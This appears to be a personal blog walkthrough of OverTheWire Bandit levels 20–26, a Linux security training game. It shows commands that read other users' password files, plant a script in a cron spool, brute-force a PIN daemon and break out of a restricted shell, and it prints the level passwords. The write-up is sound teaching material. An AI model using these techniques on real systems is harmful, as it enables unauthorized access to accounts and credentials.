---
layout: post
title: "OverTheWire: Bandit Part 3"
description: "Finishing up Bandit wargame and my thoughts on it."
tags: [linux, security, overthewire, bandit]
image:
  path: /images/unsplash-4.jpg
  feature: unsplash-4.jpg
  credit: kevin laminto on Unsplash
  creditlink: https://unsplash.com/photos/7PqRZK6rbaE
---

# Intro

<a href="/playing-overthewire-bandit-1">Part 1</a>.

<a href="/playing-overthewire-bandit-2">Part 2</a>.

Bandit wargame can be found <a href="http://overthewire.org/wargames/bandit/">here</a>.

## Level 20 --> Level 21

There is a setuid binary in the home directory of the user bandit20. It makes a connection to locahost on the port specified as the cli argument. It then compares a line of text from the connection to a previous level password. If it's correct it transmits password for the next level.

Hint is to try to connect to your own network daemon to see how it works.

```shell
bandit20@bandit:~$ ls
suconnect
bandit20@bandit:~$ ./succonect
Usage: ./suconnect <portnumber>
This program will connect to the given port on localhost using TCP. If it receives the correct password from the other side, the next password is transmitted back.
```

So I give it a port and it will connect to it, but what port to give?

```shell
bandit20@bandit:~$ nmap -p 1- 127.0.0.1

PORT      STATE SERVICE
22/tcp    open  ssh
113/tcp   open  ident
22/tcp    open  ssh
113/tcp   open  ident
6010/tcp  open  x11
6011/tcp  open  unknown
8089/tcp  open  unknown
10022/tcp open  unknown
30000/tcp open  unknown
30001/tcp open  pago-services1
30002/tcp open  unknown
31046/tcp open  unknown
31518/tcp open  unknown
31691/tcp open  unknown
31790/tcp open  unknown
31960/tcp open  unknown
```

As the hint says let's open up our own network daemon and see how it works.

```
bandit20@bandit:~$ nc -l -p 60000
```

Open up another terminal and ssh into bandit20:

```shell
bandit20@bandit:~$ ./suconnect 60000
GbKksEFF4yrVs6il55v6gwY5aVje5f0j
```

I can connect to it but it doesn't do anything, and if I try sending password it doesn't change a thing.

Let's try sending password through the port we listen on:

```shell
bandit20@bandit:~$ echo GbKksEFF4yrVs6il55v6gwY5aVje5f0j | nc -l -p 60000
```

And we open up a new session again and repeat the process:

```shell
bandit20@bandit:~$ ./suconnect 60000
```

And the port that was listening closed but also displayed something that looks like a password:

```
gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
```

Let's test it out.

```shell
ssh bandit21@bandit.labs.overthewire.org -p 2220
```

And it works, awesome!

## Level 21 --> Level 22

A program is running from cron, look in ```/etc/cron.d/``` for the configuratino and see what's being executed.

```shell
bandit21@bandit:~$ cd /etc/cron.d
bandit21@bandit:/etc/cron.d$ ls
cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  popularity-contest
bandit21@bandit:/etc/cron.d$ cat cronjob_bandit22
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
```

So it looks like there is a script that runs all the time and on every reboot writes something in ```/dev/null```

Let's check what's in the script.

```shell
bandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
```

Looks like a really simple script that gives permission to read and write to a certain tmp file and then writes the password for next level into it, let's try to read it.

```shell
bandit21@bandit:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
```

Let's test it:

```shell
bandit21@bandit:/etc/cron.d$ exit
ssh bandit22@bandit.labs.overthewire.org -p 2220
```

And done.

## Level 22 --> Level 23

A program is running at regular intervals from cron. Look in ```/etc/cron.d/``` for the configuration and see what command is being executed.

Hint is that the script is easy to read and we can try running it for debug information.

```shell
bandit22@bandit:~$ ls /etc/cron.d/
cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  popularity-contest
bandit22@bandit:~$ cat /etc/cron.d/cronjob_bandit23
@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
```

Same as the previous level, there is a script running regularly, let's chec it out.

```shell
bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh 
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"

cat /etc/bandit_pass/$myname > /tmp/$mytarget
```

Doesn't look too complicated. It echoes "I am user [username]" to md5sum and cuts the hash and then writes the password of that user to the file called as that hash in /tmp.

Let's first find out the hash of the user bandit23 since that's the user whose password we want.

```shell
bandit22@bandit:~$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
8ca319486bfbbc3663ea0fbe81326349
bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
```

That looks like a password, let's test it out.

```shell
bandit22@bandit:~$ exit
ssh bandit23@bandit.labs.overthewire.org -p 2220
```

And it works.

## Level 23 --> Level 24

A program is running automatically at regular intervals from cron, look in ```/etc/cron.d/``` for the configuration and see what command is being executed.

Hint is that we need to create our own shell-script.

```shell
bandit23@bandit:~$ ls /etc/cron.d/
cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  popularity-contest
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

Same as the previous two levels, let's check the script out:

```shell
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh 
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        timeout -s 9 60 ./$i
        rm -f ./$i
    fi
done
```

So this script executes, force stops (```-timeout -s 9```) ```-s 9``` is kill signal that forcefully stops script and then deletes it with ```rm -f``` command.

Let's create our own script and move it in there and try to get the password out.

```shell
bandti23@bandit:~$ mkdir /tmp/sh/
bandti23@bandit:~$ cd /tmp/sh/
bandit23@bandit:/tmp/sh$ chmod 777 /tmp/sh
bandit23@bandit:/tmp/sh$ vim script.sh
#!/bin/bash
myname=$(whoami)
cat /etc/bandit_pass/$myname > /tmp/sh/pass.txt
chmod 777 /tmp/sh/pass.txt
done
```

Give our script execute permission with ```chmod +x``` and move it to be executed.

```shell
bandit23@bandit:/tmp/sh$ chmod +x script.sh
bandit23@bandit:/tmp/sh$ mv script.sh /var/spool/bandit24/
```

And now we wait. We can check if our script has been executed with:

```shell
bandit23@bandit:/tmp/sh$ cat /var/spool/bandit24/script.sh
```

If we can read it, it still hasn't been executed.

```shell
bandit23@bandit:/tmp/sh$ ls
pass.txt
bandit23@bandit:/tmp/sh$ cat pass.txt 
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
bandit23@bandit:/tmp/sh$ exit
ssh bandit24@bandit.labs.overthewire.org -p 2220
```

Done, this one was really fun to do.

## Level 24 --> Level 25

A daemon is listening on port 30002 and will give the password for bandit25 if given the password for bandit24 ("UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ") and a secret numeric 4-digit pincode. This can be done by brute-forcing.

So let's first test how it works:

```shell
bandit24@bnadit:~$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 1
Wront! Please enter the correct pincode. Try again.
Exiting.
```

So it takes current password plus space plus a four digit number. Let's make a script for brute-forcing it. First we need to create tmp directory where we can create a script.

```shell
bandit24@bandit:~$ mkdir /tmp/brute
bandit24@bandit:~$ cd /tmp/brute
bandit24@bandit:/tmp/brute$ vim script.sh
#!/bin/bash

for i in {1..10000};
  do
    echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i" | nc localhost 30002;

done
bandit24@bandit:/tmp/brute$ chmod +x script.sh
```

And that should do the trick, this will make a lot of junk output so I'm going to redirect it to a file for easier reading once the script is finished executing.

```shell
bandit24@bandit:/tmp/brute$ ./script.sh > junk.txt
```

And this will take a while...

This really did take a while, after around 30 minutes, the server deleted my /tmp directory and all the work I did in it, so I'm gonna have to do it in a different way.

```shell
bandit24@bandit:/tmp/brute$ vim script.sh
#!/bin/bash

for i in {1..10000};
  do
    echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i" >> combinations.txt;

done
bandit24@bandit:/tmp/brute$ chmod +x script.sh
bandit24@bandit:/tmp/brute$ ./script.sh
```

This will generate all possible combinations and put them in the text file. And then I plan to just pipe the file into the daemon that is listening.

```shell
bandit24@bandit:/tmp/brute$ cat combinations.txt | nc localhost 30002
...
Correct!
The password of user bandit25 is 
uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

Exiting.
```

That was much much faster because I didn't have to connect to daemon for every combination. Another way I could've done this is by using sockets in python, but this was much faster to do.

```shell
bandit24@bandit:/tmp/brute$ exit
ssh bandit25@bandit.labs.overthewire.org -p 2220
```

Done.

## Level 25 --> Level 26

Logging in to bandit26 from bandit25 should be fairly easy... The shell for user bandit26 is not ```/bin/bash``` but something else. Find out what it is, how it works and how to break out of it.

Let's see how to login to bandit26 first.

```shell
bandit25@bandit:~$ ls
bandit26.sshkey
```

Well, that's how I'm going to get to bandit26, let's see what shell it uses.

```shell
bandit25@bandit:~$ cat /etc/passwd | grep bandit26
bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
```

So, instead of bash it uses something called showtext. Let's try to see what it consists of.

```shell
bandit25@bandit:~$ cat /usr/bin/showtext
#!/bin/sh

export TERM=linux

more ~/text.txt
exit 0
```

It sets the terminal emulator to linux meaning it's going to be very minimalistic and very basic, and then it reads a file in home directory called text.txt

Let's ssh and see what happens.

```shell
bandit25@bandit:~$ exit
scp -P 2220 bandit25@bandit.labs.overthewire.org:~/bandit26.sshkey .
```

Set it so ssh uses it:

```shell
mv bandit26.sshkey .ssh/id_rsa_bandit26
echo "IdentityFile ~/.ssh/id_rsa_bandit26" >> .ssh/config
ssh bandit26@bandit.labs.overthewire.org -p 2220
```

It prints bandit26 in ascii art and then closes the connection. Let's try running some commands directly over ssh.

```shell
ssh bandit26@bandit.labs.overthewire.org -p 2220 ls
```

It does nothing, not even display message this time, CTRL+C to cancel it. I know there is a file called text.txt in there so let's scp it out.

```shell
scp -P 2220 bandit26@bandit.labs.overthewire.or~/text.txt .
```

This didn't work either. So back to check out the script. Changing the terminal emulator wouldn't make any bigger difference in our case, we manage to log in, but are immediately logged out due to exit command. The clue is somwehre in ```more ~/text.txt``` line. Gonna have to read the man page for ```more``` for this.

After looking through the man page of more, I found that you can access vim through more, and after playing around with more on my machine I realized to access vim in more you need to have multiple pages of output, but output of text.txt is really small and to create multiple pages for that text I will have to resize my terminal really small.

Let's try it out, I resized my terminal real small, like 3 lines small and ssh-ed.

```shell
ssh bandit26@bandit.labs.overthewire.org -p 2220
```

More message shows up, let's press ```v``` to enter vim mode. And now I can edit the file, but editing the file is useless, I need the password and to do that I have to edit the other file. Good thing is that vim allows that.

Pressing escape and entering ```:edit /etc/bandit_pass/bandit26``` will start editing the file with the password, and password is:

```
5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
```

To exit vim just do escape and ```:q!```.

And that's it... This one was really creative and made me think outside the box, really genuis level.

# Conclusion

There is no level 27 as of right now.

I had a lot of fun with Bandit and I'm probably going to be trying out other wargames on OverTheWire since I had great experience with this one.
